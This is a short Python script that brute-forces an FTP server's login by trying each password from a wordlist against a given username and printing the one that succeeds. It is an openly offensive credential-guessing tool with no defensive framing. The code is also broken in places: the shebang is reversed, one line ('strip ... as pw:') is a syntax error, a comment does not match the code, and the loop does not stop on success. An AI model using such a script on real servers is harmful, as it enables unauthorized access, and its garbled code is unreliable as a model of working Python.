!# /usr/bin/python3

# import ftplib module
import ftplib

# get input values from user
server = input("FTP Server: ")
user = input("username: ")
Passwordlist = input ("Path to password list file:")

try:
    # read password list file into list pw
    with open(Passwordlist, 'r') as pw:
        
        # loop through pw
        for word in pw:

            # remove preceding white space and comma
            word = word.strip ('\r') as pw:

            try:

                # connect to server with ftplib module FTP method
                ftp = ftplib.FTP(server)

                # attempt to login to the server
                ftp.login(user, word)

                # if success then output the word
                print ("Success! The Password is " + word)

            except:
                # if login attempt results in error keep looping
                print('still trying...')
except:
    # error when opening wordlist
    print ('Wordlist error')